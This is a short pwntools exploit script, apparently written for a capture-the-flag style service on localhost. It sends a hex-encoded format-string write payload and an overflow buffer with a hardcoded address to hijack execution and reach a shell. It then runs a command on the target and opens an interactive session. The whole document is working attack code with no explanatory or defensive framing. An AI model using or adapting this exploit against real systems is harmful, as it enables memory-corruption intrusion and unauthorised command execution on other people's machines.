from pwn import *

s = tubes.remote.remote('127.0.0.1',4450)
print s.sendlineafter('Choice:','\x31')
print s.sendlineafter('Name:','\x31')
gdb.attach(s,'''b *0x402596
		display /i $pc''')
print s.sendlineafter('Age:','\x25\x36\x33\x35\x32\x30\x63\x25\x31\x33\x24\x68\x6e')

print s.sendlineafter('(30 bytes):','\x32\x41\x41\x41\x42\x42\x42\x42\x90\xd2\x60\x00\x00\x00\x00\x00\x44\x44\x44\x44')
print s.sendlineafter('Choice:','\x73\x68')
print s.sendline('echo 1 > /home/zr33/1'+'\x0a\x65\x78\x69\x74')

s.interactive()
